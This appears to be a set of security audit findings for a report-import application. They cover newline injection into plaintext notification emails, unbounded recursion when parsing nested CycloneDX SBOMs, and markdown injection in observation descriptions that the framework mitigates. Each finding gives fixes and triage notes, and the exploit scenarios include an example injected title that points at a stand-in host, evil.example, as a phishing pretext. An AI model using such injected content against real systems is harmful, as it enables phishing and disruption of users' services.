findings.description: All email templates wrap their body in {% autoescape off %} and interpolate import-derived observation.title / product.name / first_line unescaped. Emails are sent via send_mail with message= only (plain-text body, no html_message), so this is not stored-XSS. The realistic impact is plain-text content spoofing: a multi-line title (CharField allows newlines) injects extra lines into the body (a forged URL line or fake sign-off). Subject/recipients are not data-derived and Django blocks CRLF in headers.
findings.exploit_scenario: An attacker-controlled finding title set to 'Benign finding\nURL: https://evil.example\nPlease re-authenticate here:' injects forged lines into the plaintext email body that recipients may trust, enabling a phishing pretext.
findings.recommendation: Keep emails plain-text and never add html_message without HTML-escaping the data; strip/normalize newlines and control characters from observation.title and product.name before they reach the templates.
findings.confidence_reason: Accurately described and real, but plaintext-only content spoofing (no html_message, no XSS, Django blocks subject CRLF) — defense-in-depth at most, likely downgraded in triage.

findings.title: Unbounded recursion over attacker-nested CycloneDX components
findings.description: _get_sbom_component_with_subs (cyclone_dx/parser.py:160-169) recurses once per nesting level of the components[].components tree with no depth cap. In practice json.load itself usually hits CPython's recursion/C-stack limit on a deeply nested document first and raises (caught as 'File is not valid JSON'), which bounds this. The dependency-graph walk _get_dependencies_recursive is cycle-guarded by a visited check and terminates.
findings.exploit_scenario: An importer uploads a CycloneDX SBOM nested ~thousands deep; if json.load accepts it, _get_sbom_component_with_subs recurses to that depth and raises RecursionError, aborting the import with a 500.
findings.recommendation: Add an explicit depth limit to _get_sbom_component_with_subs and reject SBOMs exceeding a sane nesting depth; combine with the upload-size cap from F-022.
findings.confidence_reason: Genuinely unbounded recursion but self-limited — json parsing hits CPython's recursion ceiling first and the resulting error bounds it to a low-severity caught-exception DoS, unlikely to survive triage as actionable.

findings.title: Attacker-controlled report text rendered as markdown in observation description (framework-mitigated)
findings.description: Parsers concatenate arbitrary report content into the observation description (SARIF iterates result/rule properties into markdown; gitleaks/CycloneDX copy detail verbatim). The stored description is rendered via markdown-to-jsx 9.8.1, which renders to React elements (auto-escaped) with no dangerouslySetInnerHTML; the default URL sanitizer blocks javascript:/vbscript:/data: and React drops string event handlers and does not execute injected <script>. Classic stored-XSS is neutralized by the framework today; the residual is HTML-injection / UI-spoofing only. This matches the org DO-NOT-REPORT criterion for React XSS (reportable only via a raw-HTML escape hatch), so it is kept as a near-false-positive defense-in-depth note.
findings.exploit_scenario: An importer crafts a SARIF result whose properties inject markdown/HTML (misleading links, styled blocks) into the description; another user viewing the observation sees attacker-shaped rendered content. No script execution under current markdown-to-jsx/React behavior.
findings.recommendation: Optionally set disableParsingRawHTML:true on the observation MarkdownField or sanitize parser-derived markdown server-side; keep markdown-to-jsx patched. Lowest priority.
findings.confidence_reason: markdown-to-jsx renders to auto-escaped React elements with no dangerouslySetInnerHTML and an active URL sanitizer — framework-mitigated near-false-positive matching the org DO-NOT-REPORT rule.
